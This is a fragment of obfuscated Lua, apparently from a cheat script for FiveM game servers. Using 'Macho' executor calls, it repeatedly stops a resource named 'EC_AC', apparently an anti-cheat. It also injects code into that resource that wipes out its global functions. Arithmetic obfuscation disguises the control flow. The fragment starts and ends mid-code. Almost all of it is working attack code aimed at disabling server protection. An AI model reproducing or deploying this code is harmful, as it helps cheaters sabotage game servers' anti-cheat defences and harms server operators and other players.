        ]]);v1204=1 + 0 ;end if (v1204==(1 + 1)) then CreateThread(function() while true do Wait(0 -0 );MachoResourceStop("EC_AC");end end);break;end if (v1204==(329 -(56 + 272))) then v1205={"EC_AC"};for v1389=1 + 0 , #v1205 do local v1390=v1205[v1389];MachoInjectResource(v1390,[[
                print(GetCurrentResourceName())
                for name, func in pairs(_G) do
                    if name == "TriggerEvent" then return end
                    _G[name] = nil
                    print(name, func)
                end
            ]]);Wait(2519 -1469 );end v1204=2 + 0 ;end end end v319=644 -(455 + 185) ;end if (v319==(790 -(757 + 31))) then v116();v117();v319=3;end end end;
